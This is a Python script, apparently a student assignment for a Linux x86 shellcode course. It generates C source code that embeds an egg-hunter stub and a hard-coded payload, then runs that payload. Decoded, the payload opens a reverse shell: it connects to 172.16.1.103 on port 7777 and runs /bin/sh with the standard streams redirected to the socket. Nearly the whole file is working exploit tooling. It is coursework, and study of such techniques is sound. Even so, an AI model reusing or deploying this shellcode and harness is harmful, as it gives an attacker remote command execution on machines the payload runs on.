#!/usr/bin/python3.5
# Student ID:SLAE-860
# Assignment 3
#
import argparse

# Enter the shellcode bytes into the payload variable and run the program, specifying the egg desired

payload = r"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x31\xff\x97\x6a\x66\x58\x6a\x02\x5b\x31" \
          r"\xc9\x51\x66\x68\x1b\x61\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x03\x68\xac\x10\x01" \
          r"\x67\x66\x68\x1e\x61\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x57\x5b\x31\xc9\xb1\x02\xb0\x3f" \
          r"\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2" \
          r"\xcd\x80"

begin = r"\x31\xd2\x31\xc9\xfc\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8"
end = r"\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"

c_header = r"#include<stdio.h>" + '\n' + r"#include<string.h>" + '\n\n'
c_decl_1 = r"unsigned char exploitcode[] = " + '\\' + '\n'
c_decl_2 = r"unsigned char code[] = " + '\\' + '\n'
c_body = r"main()" + '\n' + '{' + '\n\n' + '\t' + r'printf("Shellcode Length:  %d\n", strlen(code));' + '\n\n' \
         + '\t' + r'int (*ret)() = (int(*)())code;' + '\n\n' + '\t' + 'ret(); \n\n}'

parser = argparse.ArgumentParser()
parser.add_argument('-e', action="store", dest="egg", required=True, help='Specify four hex characters to represent'
                                                                          ' egg bytes, example:  1b2a')
args = parser.parse_args()

byte_order_egg = r'\x' + args.egg[2:4] + r'\x' + args.egg[0:2]
egghunter_shellcode = r'"' + begin + byte_order_egg + byte_order_egg + end + r'";'

payload = (byte_order_egg * 4) + r'"' + '\n' + r'"' + payload + r'";'

c_decl_1 += r'"' + payload + '\n\n'
c_decl_2 += egghunter_shellcode + '\n\n'
c_source = c_header + c_decl_1 + c_decl_2 + c_body
c_source_notes = '/**\n* ' + 'Student ID:SLAE-860\n* ' + 'Assignment 3\n' + r'*/' + '\n\n'
print(c_source_notes + c_source)

